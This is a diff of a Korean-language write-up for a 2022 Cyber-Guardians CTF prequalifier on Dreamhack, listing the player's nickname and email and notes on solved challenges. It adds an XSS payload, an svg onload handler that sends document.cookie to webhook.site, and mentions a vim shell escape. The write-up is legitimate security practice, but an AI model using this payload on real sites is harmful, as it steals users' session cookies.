@@ -1,7 +1,8 @@
 # 2022 Cyber-Guardians CTF Prequal
 
-## Dreamhack info
+## Dreamhack Profile
 Nickname: suk-6
+
 email: wsuk.nam@gmail.com
 
 ## Solve list
@@ -22,6 +23,7 @@ vim 편집기에서 !를 붙이고 Shell 명령어를 작성하면 실행되는 
 `location.href`를 이용하여 webhook.site로 리다이렉트 시켰다.
 
 이 때 `document.cookie`를 이용하여 브라우저의 쿠키를 URI에 담아서 보냈다.
+
 ```<svg/onload=location["href"]="https://webhook.site/webhook-id/?flag="+document["cookie"]>```
 
 ### xss-1.3
